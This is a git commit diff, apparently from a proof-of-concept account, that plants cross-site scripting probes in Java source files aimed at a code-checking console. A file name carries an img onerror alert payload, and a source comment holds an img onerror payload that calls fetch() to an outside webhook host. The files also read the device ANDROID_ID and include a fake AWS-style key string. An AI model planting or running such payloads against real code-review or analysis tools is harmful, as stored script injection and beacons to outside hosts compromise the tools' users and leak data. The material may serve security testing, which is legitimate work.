3bd70648da3faa925a5753cf2cafe4276e16c770
ChecksPoc <checks-poc@example.invalid>
2026-05-26 03:04:11 +0200

    Move S1 XSS probes into returned source fields

--- Pwn<img src=x onerror=alert(document.domain)>.java
+++ Pwn<img src=x onerror=alert(document.domain)>.java
@@ -1,1 +1,6 @@
-/etc/passwd
+class FilenameSinkPayload {
+  void leak(android.content.ContentResolver cr) {
+    String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
+    String marker = "S1_FILENAME_XSS_PATH_MARKER_20260526";
+  }
+}
--- StoredConsolePayload.java
+++ StoredConsolePayload.java
@@ -1,10 +1,8 @@
 class StoredConsolePayload {
   void leak(android.content.ContentResolver cr) {
     String androidId = Settings.Secure.getString(cr, Settings.Secure.ANDROID_ID);
-    /*
-     * S1_PR_ARBITRARY_CONTENT_MARKER_20260526
-     * <img src=x onerror=fetch('https://webhooksite.net/0526b795-8a2c-495b-a6ca-3c7d494aa00c?surface=checks-console&marker=S1_CONSOLE_XSS_20260526')>
-     * AKIA_TEST_ONLY_NOT_A_SECRET_20260526
-     */
+    /* S1_CONSOLE_XSS_20260526 <img src=x onerror=fetch('https://webhooksite.net/0526b795-8a2c-495b-a6ca-3c7d494aa00c?surface=checks-console&marker=S1_CONSOLE_XSS_20260526')> */
+    String marker = "S1_PR_ARBITRARY_CONTENT_MARKER_20260526";
+    String fakeKey = "AKIA_TEST_ONLY_NOT_A_SECRET_20260526";
   }
 }
